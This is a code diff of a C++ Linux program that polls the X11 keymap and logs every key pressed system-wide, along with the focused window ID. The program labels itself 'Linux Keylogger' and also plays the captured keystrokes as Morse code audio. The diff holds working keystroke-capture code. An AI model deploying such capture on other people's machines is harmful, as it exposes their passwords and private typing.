@@ -58,8 +58,8 @@ typedef std::auto_ptr<Thread> ThreadPtr;
 
 // Morse Thread -----------------------------------------------------------------------------------------------------------------------
 
-const int ditLong = 1;
-const int dashLong = 3;
+const int ditLong = 2;
+const int dashLong = 4;
 
 const int ditDashLong = 1;
 const int charLong = 4;
@@ -104,16 +104,16 @@ public:
 		setAll0(bufferCharPause);
 		setAll0(bufferWordPause);
 
-		m[2] = (char*) ".----";
-		m[3] = (char*) "..---";
-		m[4] = (char*) "...--";
-		m[5] = (char*) "....-";
-		m[6] = (char*) ".....";
-		m[7] = (char*) "-....";
-		m[8] = (char*) "--...";
-		m[9] = (char*) "---..";
-		m[10] = (char*) "----.";
-		m[11] = (char*) "-----";
+		m[10] = (char*) ".----";
+		m[11] = (char*) "..---";
+		m[12] = (char*) "...--";
+		m[13] = (char*) "....-";
+		m[14] = (char*) ".....";
+		m[15] = (char*) "-....";
+		m[16] = (char*) "--...";
+		m[17] = (char*) "---..";
+		m[18] = (char*) "----.";
+		m[19] = (char*) "-----";
 
 	}
 
@@ -178,22 +178,26 @@ public:
 				int sk = qinput.front().skanCode;
 				char* simbol = m[sk];
 
-				while ((*simbol) != 0) {
-					//cout<<*simbol<<'|';
-					char s = *simbol;
+				unsigned long ptr = (unsigned long) simbol;
+				cout << ptr << endl;
+				if (ptr > 0)
+					while ((*simbol) != 0) {
+						//cout<<*simbol<<'|';
+						char s = *simbol;
 
-					if (s == '.') {
-						frames = snd_pcm_writei(handle, bufferDit,
-								sizeof(bufferDit) / 2);
-					} else if (s == '-') {
-						frames = snd_pcm_writei(handle, bufferDash,
-								sizeof(bufferDash) / 2);
+						if (s == '.') {
+							frames = snd_pcm_writei(handle, bufferDit,
+									sizeof(bufferDit) / 2);
+						} else if (s == '-') {
+							frames = snd_pcm_writei(handle, bufferDash,
+									sizeof(bufferDash) / 2);
+						}
+
+						frames = snd_pcm_writei(handle, bufferDitDashPause,
+								sizeof(bufferDitDashPause) / 2);
+						simbol++;
+
 					}
-
-					frames = snd_pcm_writei(handle, bufferDitDashPause,
-							sizeof(bufferDitDashPause) / 2);
-					simbol++;
-				}
 				//cout<<endl;
 				frames = snd_pcm_writei(handle, bufferCharPause,
 						sizeof(bufferCharPause) / 2);
@@ -223,69 +227,68 @@ double gettime() {
  */
 int main(void) {
 
-	Display *display_name;
-	int depth, screen, connection;
-	display_name = XOpenDisplay(NULL);
-	screen = DefaultScreen(display_name);
-	depth = DefaultDepth(display_name,screen);
-	connection = ConnectionNumber(display_name);
-	cout << "Keylogger started\n\nInfo about X11 connection:\n";
-	cout << " The display is::%s\n", XDisplayName((char*) display_name);
-	cout << " Width::" << DisplayWidth(display_name,screen)<< "\tHeight::"
-			<< DisplayHeight(display_name,screen)<<"\n";
-	cout << " Connection number is " << connection << "\n";
+	Display * display;
 
-	if (depth == 1)
-		cout << " You live in prehistoric times\n";
-	else
-		cout << " You've got a coloured monitor with depth of %d\n" << depth;
+	char szKey[32];
+	char szKeyOld[32] = { 0 };
 
-	cout << "\n\nLogging started.\n\n";
+	char szBit;
+	char szBitOld;
+	int iCheck;
 
-	char keys_return[32];
+	char szKeysym;
+	char * szKeyString;
 
-	while (1) {
-		XQueryKeymap(display_name, keys_return);
+	int iKeyCode;
 
-		for (int i = 0; i < 32; i++) {
-			if (keys_return[i] != 0) {
-				cout << keys_return << " --- " << a << endl;
-				int pos = 0;
-				int num = keys_return[i];
-				//printf("%.20f: ", gettime());
+	Window focusWin = NULL;
+	int iReverToReturn = NULL;
 
-				while (pos < 8) {
-					if ((num & 0x01) == 1) {
+	printf("%s\n%s\n\n", "Linux Keylogger - Visit www.hamsterbaum.de",
+			"Version: 0.1");
 
-						//printf("%d ", i * 8 + pos);
-						cout << i * 8 + pos << endl;
+	display = XOpenDisplay(NULL);
+
+	if (display == NULL) {
+		printf("Error: XOpenDisplay");
+		return -1;
+	}
+
+	MorseThread* mt = new MorseThread();
+	ThreadPtr pmt(mt);
+	mt->start();
+
+	while (true) {
+		XQueryKeymap(display, szKey);
+
+		if (memcmp(szKey, szKeyOld, 32) != NULL) {
+			for (int i = 0; i < sizeof(szKey); i++) {
+				szBit = szKey[i];
+				szBitOld = szKeyOld[i];
+				iCheck = 1;
+
+				for (int j = 0; j < 8; j++) {
+					if ((szBit & iCheck) && !(szBitOld & iCheck)) {
+						iKeyCode = i * 8 + j;
+
+						szKeysym = XKeycodeToKeysym(display, iKeyCode, 0);
+						szKeyString = XKeysymToString(szKeysym);
+
+						XGetInputFocus(display, &focusWin, &iReverToReturn);
+						printf("WindowID %x Key: %s\n", focusWin, szKeyString);
+
+						InputChar ic;
+						ic.skanCode = iKeyCode;
+						mt->add(ic);
+
 					}
-					pos++;
-					num /= 2;
+					iCheck = iCheck << 1;
 				}
-				//printf("\n");
-
-//				XkbDescPtr keyboard = XkbGetKeyboard(display_name,
-//						XkbAllComponentsMask, XkbUseCoreKbd);
-//				XkbStateRec state;
-//
-//				XkbGetState(display_name, XkbUseCoreKbd, &state);
-//
-//				unsigned int group = (unsigned int) state.group;
-//				std::cout << group << std::endl;
-//
-//				std::string s1 = XGetAtomName(display_name,
-//						keyboard->names->symbols);
-//				std::string s2 = XGetAtomName(display_name,
-//						keyboard->names->groups[group]);
-//
-//				std::cout << s1 << " - " << s2 << std::endl;
 			}
 		}
-		usleep(30000);
-
+		memcpy(szKeyOld, szKey, 32);
 	}
-	XCloseDisplay(display_name);
+	XCloseDisplay(display);
 
 //	class Thread_a: public Thread {
 //	public:
@@ -312,8 +315,6 @@ int main(void) {
 //	if (a->wait() != 0 || b->wait() != 0)
 //		return EXIT_FAILURE;
 
-	MorseThread* mt = new MorseThread();
-	ThreadPtr pmt(mt);
 	// Test
 
 //	for (int i = 0; i < 10; i++) {
@@ -325,14 +326,14 @@ int main(void) {
 //		mt->add(ic);
 //	}
 
-	InputChar ic;
-	for (;;) {
+	//InputChar ic;
+	//for (;;) {
 
-	}
+	//}
 
-	pmt->start();
+	//pmt->start();
 
-	pmt->wait();
+	//pmt->wait();
 
 	return EXIT_SUCCESS;
 }
